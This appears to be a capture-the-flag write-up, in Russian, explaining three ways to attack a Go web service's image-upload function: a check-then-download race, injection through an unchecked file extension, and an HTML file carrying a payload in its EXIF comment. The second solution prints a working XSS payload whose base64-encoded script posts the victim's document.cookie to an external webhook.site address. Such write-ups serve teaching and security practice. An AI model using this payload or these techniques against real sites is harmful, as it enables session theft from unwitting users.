# Writeup

## Решение №1 (Предполагалось изначально)

В функции SaveImage, которая совершает сохранение картинки, проверки на наличие картинки совершаются (47-53) но потом отдельным запросом сервер скачивает картинку (55)

helpers.go 47-55
```go
if !CheckURLExistence(url) {
	return "", fmt.Errorf("URL does not exist: %s", url)
}

if !IsPicture(url) {
	return "", fmt.Errorf("URL is not a picture: %s", url)
}

resp, err := http.Get(url)
```

Это можно проэксплуатировать если на запросы проверки отдавать валидную картинку, а потом отдать файл с нагрузкой.\
Код сервера который делает именно это приведен в [скрипте](writeup/server.py)

## Решение №2 (Найдено участниками)

В той же функции SaveImage, файлик сохраняется без проверки переменной ext.\
Следовательно туда можно впихнуть нагрузку.

helpers.go SaveImage 66-68
```go
parts := strings.Split(url, ".")
ext := parts[len(parts) - 1]
outputPath := filepath.Join("static/", uuid + "." + ext)
```

А чтобы обойти разделение по точке, можно использовать такой пейлоад.
Пример:
```javascript
"></iframe><svg id='' onload=eval(atob('ZmV0Y2goJ2h0dHBzOi8vd2ViaG9vay5zaXRlL2JiMDJhMDFjLTE4ZWEtNDViNC05NDhiLWFjYWY5ODUzNDJlYycsIHttZXRob2Q6ICdQT1NUJyxtb2RlOiAnbm8tY29ycycsYm9keTpkb2N1bWVudC5jb29raWV9KQ=='))><iframe src="/
```

## Решение №3 (Найдено участниками)

Работает из-за того что отсутствует проверка на расширение картинки.

Соответсвенно можно отдать серверу картинку с расширением `.html` и нагрузкой в коментарии exif.\
Что можно сделать например с помощью exiftool.
Все проверки пройдут и картинка с нагрузкой будет опубликована.